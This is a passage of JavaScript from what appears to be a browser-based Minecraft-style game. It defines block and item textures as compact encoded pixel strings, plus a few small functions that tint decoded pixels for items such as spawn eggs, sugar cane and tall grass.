    ironTrapdoor: "0g0g8WYcW;ZH00WZH4JPi]%$Bp%p|q||{Bq|q%q%%|%4JJPi]",
    darkOakTrapdoor: "0g0g8]HYSWEKZ(Z;WyH2H0JTw009Feee(eMg0g0gi(ijO4PwJ80JT0iS99e&eM&Mg0(0gi(ijO0iSA0",
    crimsonTrapdoor: "0g0g7W]HXYH6WY0004J9wPFJQ$a0m8pETA%FA^Q(PygpEpEJ82KdA$EAiEgEa5waQJPo4J141",
    birchTrapdoor: "0g0geCWH8HEZ^WZZHZHZHQHZyW1h01h1hg2OOyOOyxj000000Mj?Mj@KMiVGGM2KM3@IIKx3KwjGVGMjK(jK(3Qw3PyySx2OyyO(0hg01hg1",
    acaciaTrapdoor: "0g0gaiYRYWYNY000W?WW)H000000001izOOONw4QN4>wQ(1V5wV(1V5wV(1V5wV(1V5wV(1V5wV(1V?AV(1V?AV(1V?AV(1V?AV(1V?AV(2zy+NzK1+,IIg009GG00",
    
    redBed: [
    	"0g0g4WYJWWhVgEnllZ7ZVVUVkVV7xV7]VUlVf1VvVU<lSWZSgV5!",
    	"0g0gdZZ|WcWZZZWTWWXYJWWYW0h0yy0h01zOOOONghN1hhgzhh(kQQT3hgMQQQQj10MQQQQj02N1hhgzwVVVVVVVVGGGIIGGGGGGGIGGIIIII",
			"0g0g7ZZZWkZW*WZW0iK000iK000iK00&@P0P0&@PA0000000000000000000000000000000000000000000000000000000000000",
    	"0g0gbWXYJWTWW*WWWZkZZZZ100yyyw1hhhg000hg0hhhhhhOOOOOOOOQUU?UGGGGGGPg2yyyw1hhg1hhhhghhg00000OOOOOOOO?U??QGGGGGG",
    	"0g0ghZZWTWWJWYY|WXYW*WWkZZWZZZ02gX2pasS2g2paRgXx2q]RFgXx8RoM%%^F}Rzg2gX0FeRzi0gX8xeRgigXx8oMgXx8RM|Xx8RgXx8RgXx8RgXx8RgXx8RgXx8RgXx8RgXx8Rg",
    	"0g0gfXYWJWTWTW*WWWZWZZ|WWZZZ01hiyyx000hhhh0000000000O)OOOOOOVVIIVVII",
			"0g0g7VZ*HWWkZHRZ4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG"
		],
    redBedIcon: "0g0gb000W0WZYJHHgHSWWkZ0000000000001h000002zQg0002B)T002CVzQg0C)g2x2yF2Cyy8yyyI89yyI00008yI00000000000000000000I0000000000000",
    
    respawnAnchorTop1: "0g0glUZ$WE7YwW&HsWKqY00WA4HA4YA4W(5Z)6W$5Y{7H(6WE5WA3ZA4Z;6YA3Y0Q00S0010w8(Xzoic0F^h.w0.w0Pw0^_}0^FK0!CKg^)eK0w0^.w0^.gF^K8TXzo@g0SK00008w",
    respawnAnchorTop2: "0g0grUZ$WE7YwW&HsWKqY00WA3ZA3HA4ZA4WE3WA4HA4Y$5H$5Y(5Z)6W(6W{7HE5W]7W;6Y-6HA3Y$5W0Q00S0010w8(Xzoic0F^h.w09^w0w0^MC0^K0bVKg^pOK0w0^w0^.gF^K8TXzo@g0SK00008w",
    respawnAnchorTop3: "0g0gvUZ$WE7YwW&HsWKqY00W-6HA4WA4H;6Y)6WA3ZA3HA4Z$5H(6WE3WA4Y$5YS6ZE5W(5Z{7H]7W(5YA3Y$5WS6YQ7W0Q00S0010w8(Xzoic0F^h9w0w0^Fw0_,z7k0_kK0Kg_UrK0^w0^;w0^gF^K8TXzo@g0SK00008w",
    respawnAnchorTop: "0g0gvUZ$WE7YwW&HsWKqYA3HA4ZS6Z-6HA4WA4HA3Y$5HQ7W;6Y)6WA3Z$5W(6WE3WA4Y$5YE5W(5Z{7H]7W(5YS6Y$6Y0Q00S0010w8(Xzoic0F^hB_qw0I@[/sw0&kw0_V0_MkK05_@wkKg^|D{K0>(kw0^Cpkw0^ogF^K8TXzo@g0SK00008w",
    respawnAnchorTopOff: "0g0g8UZ$WE7YwW&HsWKqY40Y50g048%_eZZZZ]eZZZZ]eZZZZ]6ZZZZ6ZZZZeZZZZ@ZZZZeZZZZ]6ZZZZ]6ZZZZ}%_J4K080I",
    respawnAnchorSide3: "0g0ghUZ]WE7YKqY$WwWsWHlHZZZZY40Y00WgMZAZ-H&H0Sw0180wxQggMI14FRgMgX9RikTSX8^Rakx9m/co#S{92l9cXaSw0]i*jQRoXxcR)RX)MCS%j[8M++%",
    respawnAnchorSide1: "0g0gfUZ]WE7YKqY$WwWsWH40YZZZ00WgMZAZ-H&H1201jgjg?x4SxUVhmhVlh?UhhUVIV?hkIITIIoIIkhTkhTUmg1T_#A@QQ_yB#NN#=/II",
    respawnAnchorBottom: "0g0g840Y00WE7YgMZ-HAZKqY&H4oN4NoC^?]f*)(qh:y6^5QFCVq~n(20$DiiN6bA)Ep]Kt0",
    respawnAnchorSide4: "0g0ghUZ]WE7YKqY$WwWsWHlHZZZZY40Y00WgMZAZ-H&H0Sw0180wxQggMI14FRgMgX9RikTSX8^Rakx9ma/coES{92l9cXaSw0]i*jQRoXxcR)RX)MCS%j[8M++%",
    respawnAnchorSide2: "0g0ghUZ]WE7YKqY$WwWsWHlHZZZZY40Y00WgMZAZ-H&H0Sw0180wxQggMI14FRgMgX9RikTSX8^Rakx9mo#{92l9cXaSw0]i*jQRoXxcR)RX)MCS%j[8M++%",
    respawnAnchorSide0: "0g0gdUZ]WE7YKqY$WwWsW40Y00WgMZAZ-H&H1201jgjg?x4SxUVhmhVlh?UhhUVGGV?hkGGTGGnGGkhTkhTIUmg1TPFA@QQPyJBFJJNNF;-JGG",
    
    flintAndSteel: "0g0gc000?kHYZ(WWkHVVHEY4gHZY0000000000h0000001yg00000i)U00000iSQ00000jg000000jg000000lgk06000?M)0K004S6X000Q000006X000060006[000000000900",
    oakSapling: "0g0g9000RNZZtYhTWYRZZ{H000000000000010000020O0000Si0?000MQG00xzK@N002m6Kxw00002w003@x4(007Ni+00j+g1h7C1g002jw0g001Eg000007w000007000",
    cryingObsidian: "0g0g840Y00WE7YgMZ-HAZKqY&H4oN4NoC^?]f*)(qh:y6^5QFCVq~n(20$DiiN6bA)Ep]Kt0",
    netherGoldOre: "0g0gcHUWYYWSH1HY4WZYZHZ12NQO)MjMBzR5Ow>>2MN)X.k)3z][]QAM4MIQ:O>3RU)>!XT5z>_IN)NCOQ()zP))S2k)]QC+ANbA(i3>A/J4)(k)]Pj]SzQxC))Oy)R)lzQO",
    
    potDirt: "0g0g7lZYYYoHZH49Pg?S9(J9C)yBkaE%U{)9E84]2$FkQ?Pwh?0KNFih{RPA?${)9FX1kEiBy",
    flowerPot: "0g0g6000zYOY3HWZ000000000000000000000000000000000002000020000200001000000M000000000N000J0",
		acaciaSapling: "0g0g7000MZHWWZ(Y000w00041000C01N00#|05007bk00i02J0010001b00i00020000B0000B0000)00",
    birchSapling: "0g0g7000WYWHZY000w00002S00001000Iw000y004004c000a000C0203S0Aw004iw000a@0003)0000300",
    blueBerryLeavesNoBerries: function(n) {
			let pix = getPixels("0g0g5VY000H?ZH0ANiCSI32!2F918ckUTxSi?CRA9kiNm{8A^2Tz1]0jwTz0E94Fmw6ixgE+(h]S0Sg?y");
      for (let i = 0; i < pix.length; i += 4) {
        setPixel(n, i >> 2 & 15, i >> 6, pix[i]*0.5, pix[i + 1]*1.2, pix[i + 2]*0.5, pix[i + 3]);
      }
		},
    crimsonRootsPot: "0g0g7000ijSiHjHTZiY000000000000000000g000004(00ao00bKK001E008000700d001(000w0000r009fS009oK0",
    darkOakSapling: "0g0g9000RNZtYhTWZ{HZRZY0000000000000000000001w003xg0M3000kzkzi00MBR+>003xz(0002ONC000j+y*003(V)g003i0000kD0000*GK00000000000000600",
    jungleSapling: "0g0g9000+2W%YFwZ$Y(Y-ZwHoH00000000001w(000002jR(00004*Ti0000xQ>T00003m)300000z00002)k(0000hMMw0000wCQ000005x00000N300000>000002mR(00000C000003[X(00",
    spruceSapling: "0g0g7000wWgwW%yZ.Y$YY00000000100000aw0000q0001t$0002Q001001Ng008&0006A001(00bu00m}8000B000dw0002S00",
    warpedRootsPot: "0g0g5000mHiHlHlY000000001E00001E00002i00i08K,01hS800Sq1)00E0010000T000@0000o80000000100001400",
    
    smoothBasalt: "0g0g6|AZ-YZ(ZYoW5yS02x0]]S5Tm2Si^i0$mR}0N0&9XI%XwA14A1A9E44BgX%]wwnE4S]A]Sw",
    crackedNetherBricks: "0g0g8oMW;HQJYwTHEY(Z-Z8gH000000BmX?[0+0+zs}7aAA00c03ub[@ddJJ",
    polishedBlackstone: "0g0g6|BH;H(HkMWAZsTY0840^5ih]EiJIV1iFk0E82^IBiFkx2U4B0XB?bBk9A4i{8U5AM^8iFq|EUP$JP$",
    chiseledNetherBricks: "0g0g7QJY(Z;H-ZEYoMWwTH0229238EpAgAd{d,U?QjPcQBsdcSc:V#ch]dQdQSa:T0ctQ%",
    
    crimsonPlanks: "0g0g7HYXY]HWQW;Z4AJ9A080Aw2cJi3aAP2KwoX1_0jA92PAX40czSAA4A4PQiA9cgPNg0AG",
    deadBush: "0g0g5000HJYRZH0000g004010040006Q000g000w000Jq0]0m)S00(000b]0001]0002{0000000p+00010001A00",
    
    chainIcon: "0g0g4000AZP@H<lW000004S006S003000900cS004S006S0030001000d00cS004S006003000000",
    lanternIcon: "0g0ga000<lWP@H>W2WWQYCHZHZY000000000000g0000001w0000002g00000010000000ix000000)>000001yyg00004S00003(00003(00003(00004S00001yyg000000000000000000",
    soulLanternIcon: "0g0g8000<lWP@H2Y#$ZGHZZZZZ000000000w00001S00002w0000100000aQ0000hE0000]000000000000000000000]0000000000000",
    
    coal: "0g0ga000sZ$Z(WAJH)H-HAHgTHsW0000000000000000001hg00000iOx00001?Qg0001UNNT0001G?)g00kAVA-00iRy[]00kyAQDG0kQDPP0pGG08000I0008I00000000000",
    stick: "0g0g8000?kS]HEYJHMZS)S00000000000]000020000lo000000050000!(0001V000a0000VK000000005000E001@W00010000000000",
    emerald: "0g0gb0001SWY>HnWZ2Z0W2YZ1Y0000000000000000000hh000001z)g0000i+[0001B+001U?001U?001U?001UP001UP/X000m0000100000GG0000000000000000000",
    lapisLazuli: "0g0g8000oZ4Wt^YeW*WYh8Y000000000000001A000bJ000030303C0q00v0001001:q]000A000000000000000",
    diamond: "0g0gb000hYZZZZH_YYzrHlWqHuPYLY0000000000000000000hh000001yzg0000iQ0001AV*@001AzzQ00iRQV00i>?V00iCVU00jQII007]007000QV00007GG0000000000",
    goldIngot: "0g0g9000WUYZZWZWWHZZZ000000000000000000000h000001hyg000hjOOM01hzOOONSlOOOOOV)iOO*V+Ai*OVAiN,AnN,AS1,GQS00nDQ00001kS00000000000000000000",
    ironIngot: "0g0g9000ZYWYZZZ)H8WY000000000000000000000h000001hy(000hiQQz01hAQQQR(lQQQQQV>iUQQ?V>CiBQVU,CiyV[OOyCny[OOyK1[OGK00nD00001mK00000000000000000000",
    copperIngot: "0g0g9000iYH2YHOWWWbH000000000000000000000h000001hy(000hkB>01hARVAR(mAQBQ>kRy@BkCQykBBODkVVy1BBG00l?DG00001n00000000000000000000",
    rawIron: "0g0g9000VOYWZY#WZZ-Y,HH000000000hhg00001z)xh0001**)Nhg0kV)x0kAVO>RRgGRGIgDGoGgIDhhoKIhjUGKhQ>D6IRm00Gm00006GhK00000000000000",
    rawGold: "0g0g8000WSHjWZZZZZZhY000000000000009AJ002S0kI07+J7A)6ytP:vt!&3%3~0ti0f3Z000000",
    rawCopper: "0g0gh000FUHIH},Y.WZWWH}YZbHWHZyHWAH0000000000000000000000gX00Qx8002Ngx9{S0FK0BB!g9KhaX$0hNg$0hlegBKxj.2X-}h.4u-RG;46[gg0x8$02xR0000000x8000000000000",
    copperOre: "0g0ge-ZZHY.WZZHW5Y6Y.YW}Y00g1zyhxhxyhhjNhiQ*OCyh2U?(gxyBPhyhg.2Bwxh8zxzBxrM0)M0sgi4I1w{lMgih8j,h1yiy)zzM0PP]1)gI18h0ghiighhg1",
    
    netherWart: "0g0g7000W]0WWYJYgY00000000000000005000+q0S+3.]}ppbI61S51+@5++-+-;5$9y9iEy",
		wheat: "0g0g7000HYVWZjHZ0080008h0005a0g0d0z0e(q|g813+120ak(?k78g3dg2mo8!k-q#S@#)CEECo;(",
    
    lodestoneSide: "0g0g8YZ-ZZ-ZPBWYH42Pk]5%Z;+,*r+PG-#!JC%KB;^P;iPi",
    lodestoneTop: "0g0g5YZZY-Z40]0i09CP8080h8jc(p$oi8J]pc?iPEc]JPyEQJP]oEJyock^]pEocjAio8090g9+)0iPwg0",
    anvil:[
			"0g0g6;ZT4WPAYY?W-Y0QS5]J]I1BAg4A9kJ?wUy55y1Pi4PE0!Pg6QSiSFy09]5Tw1J%0iSiS0P0",
			"0g0g6000T4WPAY;Z-Y?W000000000000000000BmB!FA_^^_VVVFkiB{000000000000000000"
		],
    
    slimeBlock: "0g0g56%C%+%090kdS0z|21AwR$o00Tc0ySS8iS}g08g0]0S80008001g0g2igwg04x000S)44i9w4XJd0900S",
    soulSoil: "0g0g5jY]Z;H)WQH4^gABNj|24Fj8PwQ1|A2a0]0^]20iw8F1wAP]91Fwag]9]JJ2SmgiJ01+Qm5)KXF4",
    blueIce: "0g0g5HYZZZLZ4I90]2)P0J^x)TwS1A5qSaQmSgJSCK6wA5qx+JBgBCBw5kxgh0k0i94T0IAI5AA9AB+|C",
    packedIce: "0g0g6HYYJZfZYZHZ0QC5E]SF@a0Prw9Pgh1yJ?A]9ABy^PC0JF+I4BSFAIa0)S0T|2^g9Q2JPFiJJ^|kAJ",
    ice: "0g0g6YJYfH0iC@0NmKgJP0Cip4Njc0P9w2ig82]PXii]]XJSeSA0$J4%114A9xAP09w2C]",
    calcite: "0g0g6HHH$HZZZW5mSFDiF:(iFw0|0gSJBlwFCF]bRAS]bF1JjQQ4AAyKF:6SPT|+",
    
    loomTop: "0g0gdWHZZ*W(Y2HbHW4YH?YW1xxxMxxw?*BBB**)@++CCCC)@C+C+++A@CCCCCCA?BBBB]EEAP@++@CCCCA@++++++)?bb000b@+++?0S0S",
    loomSide: "0g0g9W?Y3HUY)WUH4YHH0010hhg0iyyyyyywi)QQQQ>xkUQQVQ?xkQQQRyzMjyRQQQQxkQQQQQQxmo011011iyyyyyyxkQVVUQ?xiyyRQQyxi)QQQQ>xiVVVQVUxg00101GGGGGGGG",
    loomFront: "0g0gfWZZ4Y*W7H2HHWHUY3H?Y(YH11112210NNNNNMNOMNNNNNNONRRRRRR>*??????>*??????>*,(90993.){{><<<)000>",
    loomBottom: "0g0g42H(YWH0000lVVg008g008lVVg008g008lVVg008g008lVVg008g008lVVWZZ0000",
    jukeboxTop: "0g0g7EW)YWY>YWoH09A09@ep&oeP&oPeuPeuPNuPNuPNuP&uPK&uePK&oeP&p9J+0iPA0",
    jukeboxSide: "0g0g6EWY>YWSYW0000005+I9sge:#odadtga:#85[U?adVtga#!88UV?g6]]I4JPAJ]000000",
    noteBlock: "0g0g6EWY>YWSYW0000005+I9sge:#odadtga:#85[U?adVtga#!88UV?g6]]I4JPAJ]000000",
    furnaceFront: "0g0gd)Z;YYHYJPWoHwWgTWYWsHZ00g0hgh02zNNOzzSk*+zN(2nGGw3IIIIjTjEIGGIT3EhhoSjMjANRNNwb9c[II5IIII33IGGIl-GGGGihg001hx",
    furnaceSide: "0g0gc)Z;YYYHoHJPWsHWYZZ00g0hgh02O>UO)Ow2@NV>VS3Vz@V*2?UA*AMizN?(13>VOQwkVVRVTjQNACVU(7GGGGGaIIIqKmKb3)>QQQO(00g0hh00",
    furnaceTop: "0g0g7)Z;YYYoHHJPW020AS9DB|a.Ef|[m%+a+Fo,:Krr0n)![MCwnBEaE|020A0",
    blastFurnaceFront: "0g0ggsHY-ZYH;WPAY|)ZYZoYWZgTWHZ1y)))>1ylVlCGCPVGP*IV?G@QQ,,001h+*U*&cMN;MN]cc9NIIQQQQZIIIIIIII",
    blastFurnaceSide: "0g0gfsHY-ZYH;WPAY|)ZYZoYWHZZ1y)>Q>1ylVlCGCPVGP*IV*@II[IGG*VVV$/%yz/!!!&z/!!}]X}Q}Q]IIIIIIII",
    blastFurnaceTop: "0g0g6YHYPAY|)Z;W4JP0Pxd+,PxeAE[PB!|+}_zBy|qi@+E%s^/x4giPy",
    smokerBottom: "0g0g8RZ)Z;Y-ZYYoHH0PPkcD,W,aO|:W!_=DPZ0KPPyS",
    smokerFront: "0g0gjWRZ;YHH-ZYYHPAYsHAJHoYoYYZwH)H)Z0Qx8RgXx80pagwS0^SXx2ikA0c.o8%o0w{Mozo{Mooi)Axq*X9x8J(XP8S3ow(Ig8gF]R0^(E0iQAIPigz8oMX8AxF^F]",
    smokerSide: "0g0gcWRZ;YHH-ZYYoHH)ZJPW1yyyyyy0)jM>)lT1Uh?Qh?k0GGGMjI0TIjMGT(IIkQQkVQUVQV3(lMllMj?k?QT1O3Ijjk??",
    smokerTop: "0g0gaRZ)Z;Y-ZYYoHHAJHoY0hxhyxy03k?(hVVhlV[niIIx[B?EIIQikIIDIICIImIIhnEIIQAiIIxVCQUh[?GVh0l?U((hxhyyh0",
    
    chiseledSandstone: "0g0g7YYW^WpHYW00SAP|z009AJ}d,,u%G,C|C+%+CPCAJPA%~_VU}|C",
    cutSandstone: "0g0g7YYW^WpHYW00TAJ^|A+J00AJ9)[t9m%|)MN+@&*r},C+F|]^U",
    sandstoneTop: "0g0g5pHWHY/W5y^yU?AP({CiPS?iA1Ai]JxiUEyUAyEyPJUCREJEK?iMj4B@CiA^PQTo^]^",
    sandstone: "0g0g7YYW^WpHWY00TAJ^|A+,yPeP|*_y)RDAi$F+",
    sandstoneBottom: "0g0g6WpHWY^WY5DqJi!@0J()c8bco^]Q$J+0m4J*A|?EKp$2pyrzzJ6t4N]a}Fyt{0",
    
    tallGrassConnected: [
			/*top*/function(n){
				var pix = getPixels("0g0g60008WZPHWH400000001000010S1100wc00wc600(8400(X8400wX8)w0wI#S0wC0cC{E02C{E00Cg{(00Qg(844gwS")
				for (let i = 0; i < pix.length; i += 4) {
					let bright = pix[i]
					setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
				}
			},
    	/*bottom*/function(n){
				var pix = getPixels("0g0g60008WPHZWH0Xg)S12gK(14oSw86oxS4mgx0QklT0]odKSde|gaBwNCVr!V)F|$B")
				for (let i = 0; i < pix.length; i += 4) {
					let bright = pix[i]
					setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
				}
			}
		],
    apple: "0g0gb000WZUYTHTZZHYYUwZ00000000000010000000z0000000g000004TMg0004[g00?h00?III00?G00l00lVV001VV001?VGU000U?^0000ahq0000000000",
    
    diamondPickaxe: "0g0ga000cHOY#qZCY]HMZ8JWJHEY0000000000000000000hhg00001zQM0000nGQ000000[000005>0000000500000005000000700500000000000000000000000000",
    goldenPickaxe: "0g0ga000HZHHH]HMZ;ZJHEY0000000000000000000hhg00001zQM0000nGQ000000[000005>0000000500000005000000700500000000000000000000000000",
    ironPickaxe: "0g0ga000?kHZZZYcW]HMZoYJHEY0000000000000000000hhg00001zQM0000nGQ000000[000005>0000000500000005000000700500000000000000000000000000",
    stonePickaxe: "0g0ga000PAYYEYZ]HMZoYJHEY0000000000000000000hhg00001zQM0000nGQ000000[000005>0000000500000005000000700500000000000000000000000000",
    woodenPickaxe: "0g0g8000)WJHWTZ]HwKYEY000000000000009A000000e?0002000m000(005d(00!c010c0a0100002000030000000000",
    
    flint: "0g0g8000wW;Z$Zc(ZVVHZY000000000000000A0001{000a^00000200kn00P00{K02kB00@008_PS001AJ00000000",
    mossBlock: "0g0g6PH3WTZZWRZ50h!nE}2AS4l|NK9Erzw6x4$72Q)ci?c(J9$04kcQ$Fw1oFgO4c0{hrbz@x",
    
    caveVinesPlantLit: "0g0gd000WPH{HRZ1WTZTZTZJW3WYzW00ih)S00hjiQy0507hAS02aS0C?00yQx0(004Rh(2004qg3CF0a1ly00(iD00MxlQ001h1A?00039iQ002qk00Cwha00yy0w",
    caveVinesPlant: "0g0ga000WPH{HRZ1WTZTZTZ3W00ih)S00hjiQy0507hAS0209S0CB4?00y3Qx0(004Rh(2004pg3CD0091ly7000(iD7000MxlQ0001h1A?00030MiQ0020pk00Cwh900yy0w",
    caveVinesLit: "0g0gd000WPH{HRZTZ1WTZJWYzW3WTZ00ih)S006hjiQDw0]hARw4obS04I$0004{c3y00Q#cDz004R68S04klk04_Kl000K]w00b40045y0042U0000S0A0000000S00",
    caveVines: "0g0ga000WPH{HRZTZ1WTZ3WTZ00ih)S006hjiQDw0?*ChARw4o8S04F0I004P93y00QE9Dz004RI62xS04kl8k04]KlS6X000KSw00840045y004X2U0000S0AX0000000S00",
    sporeBlossomBase: "0g0g50003WRZZZ0000000h020b60N]d@mdkME]5hJy10)0?S0+1h5i+0dNbK2d904000000",
    sporeBlossom: "0g0ga000YZsZP0.WnHWAWY0000000000000000000000000001g000000ix000001zNg0000jOOM0004Nz*S00RjyyMA06OxyyiOK7NNxizz7jylyM7xVVi0GVVG00700000",
    hangingRoots: "0g0g7Y000lZYUWHY4g4mIyyAO{AzwNe(}A{C-|CP9Ae9AJ|APAJPJPAJPAJPAJPAJPAJPAJPAJPAJPAJPAJP",
    rootedDirt: "0g0g9lZYYYHYUWZoH1i(TBNwwAx>wU>2Q42Bzn5>hBwiikCjDTNzh+NzywyRwR0x?C0ykhRkiBzxkyNxCNimSxx2RzkRiAg@iMzzihUAyR0AyylzBhl(zA0xAiTiTyh",
    floweringAzaleaTop: "0g0g9ZRZW3WZW]YVTHPH1gziiii01zNMM(jOzAilgNzh*zkNO(w6@1(MiNjzjO2yMzwMNwwx?hjji2ORBji0zhkMh22zj2NjMzzxNMxy?xM(z3i>zjhNzONR3OM31MzNE0xxxxN0",
    floweringAzaleaSide: [
			"0g0gbPH3WZRZWZW]YVTHTZ0001iMw)BzigK6QwNU7jy)jA)(zAAz>T323C>BMwA2*z@ymg2P,Fl)Nij))M/Naz!",
			"0g0gbPH3WZRZWTZ000QZ{HhZRH1iMw)w2zi)kgS0gQwMNNk2(jyzx)jA)(zAAz>T323z>xxMwA2(z>Tyig2?M>Bi)2Nij))M,2N34zD[5GI"
		],
    azaleaTop: "0g0g5ZRZW3WPH4XE5+|wb$B2FSmJ%29CTSA1N{{PB9y|m?w?jca(C+1k?y",
    azaleaSide: [
			"0g0g7PH3WZRZWTZ00040F82AT(CbP)%[o|?jgd-?k9XyIF&s*",
			"0g0gbPH3WZRZWTZ000QZ{HhZRH1iMw)w2zi)kgS0gQwMNNk2(jyzx)jA)(zAAz>T323z>xxMwA2(z>Tyig2?M>Bi)2Nij))M,2N34zD[5GI"
		],
    pottedFloweringAzaleaBushSide:[
			"0g0gb000Z3WRZWZW]YVTHTZPH000000000000000000000000000000000000000000i)zk0000l>R0000@iN0000nR0000PN>0000xz0000(M10000g4S400000000000000000000000000",
			"0g0ge000WZRZ3WPHZW]YTZVTH{HRHhZ000000000000000000000000000000000000000001xzjk003jAA)w005zmyS002p,FS002R(004(N003w1r000b000000000000b000000b000"
		],
    pottedFloweringAzaleaBushTop: "0g0g9000RZ3WWZZW]YVTH0000000000000000000000000000000000hzjz0000zA0000h)0000z)0000ijQN0000jNh0000N>O0000MNNM0000000000000000000000000000000000",
    pottedAzaleaBushSide:[
			"0g0g7000Z3WRZWTZPH00000000000000000000000000000002{003bw008F002I009004}006Mg0024S0000000000000000000",
			"0g0ga000WZRZ3WPHTZ{HRHhZ000000000000000000000000000000000000000001xzjk003jAA)w005zjkyS002m)jCS002R>(004(N003w1nK000700000000000070000007000"
		],
    pottedAzaleaBushTop: "0g0g5000RZ3WWZ00000000000000000000000002%(004g0020040020020060060000000000000000000000000",
    
    sunflowerFront: "0g0g7000HZZZYHWW00000000000000000000000000aQ00000002004w004002000000b00000000000000000000000000",
    sunflowerBack: "0g0g6000BHlHZ^NYZ000000000000000000000000009A0000I002g002g003#g002g000UI0009A00000000000000000000000000",
    sunflowerConnected: [
			"0g0g6000BHlH^NYZZ000000000000000000000000000000000000001w00002w00003S00004K000040006]0006K0000K0000jS0000200",
			"0g0g6000ZZ^NYlHBH001{0000qS00002K0000200020003S00010000qw00002{00060007K0009#K0001z00004000040000500"
		],
    
    waterBucket: "0g0ge000)HYYx;Z%W?Y*YfWYYWHZZZ00000000001hhg0001izOMg00i?Ux00kT00hkTh00phhr00p00p00q00r001g001g000q00001hhg0000000000",
    lavaBucket: "0g0gd000)HOZY,YiY?ZYZHYWZZZ00000000001hhg0001i)?g00jCBT00lCC00nC00qI#00q00q00n00r001g001g000n00001hhg0000000000",
    bucket: "0g0g9000)HWHYZVVHYZZZ00000000001hhg0001iO)Tg00iBVyzx00lyy00hmxh00nThhiM00nG>yM00n>yT00k>yT00i>yM001G>zg001[Ozg000kNM00001hhg0000000000",
    
    spawnCow: function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 68, g = 54, b = 38
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 161, g = 161, b = 161
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
    
    sugarCaneIcon: "0g0g7000HHOHF(ZY@1Z.Y0000000000000005(000j?000*4S01!M00ho01c009CP2100K000,0000100000000000000",
    sugarCane: function(n){
			var pix = getPixels("0g0g8000Y6HHYkHWG2Y50e0ie0eKeEee0e0e0e1E50e0ie0e00e0e0ee1Ee1E0e0e0e05ee0ie0e0")
      for (let i = 0; i < pix.length; i += 4) {
        let bright = max(pix[i],pix[i+1],pix[i+2])
				setPixel(n, i >> 2 & 15, i >> 6, bright, bright, bright, pix[i + 3]);
			}
		},
    
    diamondSword: "0g0gc000cHZW8JW#qZOYlHuDH]HMZJHEY0000001h000000iz000001Az00000iR(00001A00000i?(00h01U000mgl?(000100001G(00000mj000008h(0000Oj000h00O000m(000000O(000000",
    goldenSword: "0g0gc000HZZZ;ZHZHWH]HMZJHEY0000001h000000iz000001Az00000iR(00001A00000i?(00h01U000mgl?(000100001G(00000mj000008h(0000Oj000h00O000m(000000O(000000",
    ironSword: "0g0gc000?kHZZZoYZYYH]HMZJHEY0000001h000000iz000001Az00000iR(00001A00000i?(00h01U000mgl?(000100001G(00000mj000008h(0000Oj000h00O000m(000000O(000000",
    stoneSword: "0g0gb000PAY]ZZwWHY]HMZJHEY0000001h000000i)000001zA00000iNS00001zA00000iNS00h01A000mgl*S0001UU00001VS00000mk000007XhS0000Qk000h00Q000mS000000QS000000",
    woodenSword: "0g0gb000)WWJHwKY1YQH]HMZJHEY0000001h000000i)000001zA00000iNS00001zA00000iNS00h01A000mgl*S0001UU00001VS00000mk000007XhS0000Qk000h00Q000mS000000QS000000",
    
    floweringAzaleaLeaves: "0g0g8Z000.NH3WRZZW]Y505A>w5_Q09^@hSA]riyrQ4oi4uzhKSo=bE41li%uie-A40]^A",
    azaleaLeaves: "0g0g5Z000.NH3WRZ505y>w5_Q0i@h0Pwn9AP]rkyriX4Qoi41]zhKSoAbE41e@h%i@ie-A40]^A",
    
    spawnPig: function(n){
      var pix = spawnEgg.slice()
      var pix2 = spawnEggOverlay.slice()
      for (let i = 0; i < pix.length; i += 4) {
        var r = 240, g = 165, b = 162
        pix[i] *= r / 255
        pix[i+1] *= g / 255
        pix[i+2] *= b / 255
        setPixel(n, i >> 2 & 15, i >> 6, pix[i], pix[i + 1], pix[i + 2], pix[i + 3]);
			}
      for (i = 0; i < pix2.length; i += 4) {
        if(pix2[i+3]){
          var r = 219, g = 99, b = 95
          pix2[i] *= r / 255
          pix2[i+1] *= g / 255
          pix2[i+2] *= b / 255
          setPixel(n, i >> 2 & 15, i >> 6, pix2[i], pix2[i + 1], pix2[i + 2], 255);
        }
      }
    },
    
    crackedDeepslateBricks: "0g0g8YZP)ZT4W-H$ZAJHoY4PA&wS0S0w8J8%5A9@(;PuauJ$YA>nJ1(X0Iw40lxCRV&+e5CJPA",
    crackedDeepslateTiles: "0g0g6$ZAJHT4W-HYP)Z49wJ19$nKp]ArA0AJ1AgPJ%Uc2odTwg0w2Pd^$j]Aw2J|A109ANT+x",
    deepslateRedstoneOre: "0g0ggYH?W;W$H{H-ZgHgH0WZgH0WEYYZ1yyOhizyzQOOxyOzh1lQ>)ONlG0hi>Eghz0xx1i&yONlOghV>ywn,yxy/uNz)>0hCVKzzN1ii-hO=hz>QO0h)(ixg0iiAwhyh",
    deepslateEmeraldOre: "0g0gcYH?W;W$HYnW1Y*Z>HuYnkH1yyOhizyzQOOxQOzkiAQ)ON3Ox1i>0kh0hz0zPhxyx1oOQNj]z?*0ii++0xA>(1g2NzPM0hzg01iOQhhO)hE4O0h4(2xg0i0Awhyh",
    deepslateDiamondOre: "0g0gcYH?W;W$HM4Wv|HGWm.WEZZHH1yyOhizyzQOxyOzh1BU>Ni,0i>yO.ghz0x!hx1NiV>yDOViON:yD)>iiz0hzg0B1i*hOhEO0p):Jxg0iiAwhyh",
    deepslateCopperOre: "0g0gdYH?W;W$H.WZH5Y6Y.YW}Y1yyOhizyzQOOxA>zkV3QO@ONgBx01i>yghz0Eh)>x1i03z]XNi)>gqyz?wi:1y*03i0z)Sygh0g7zzN1iOBONhOR>?0hz(1iw00iiAwhyh",
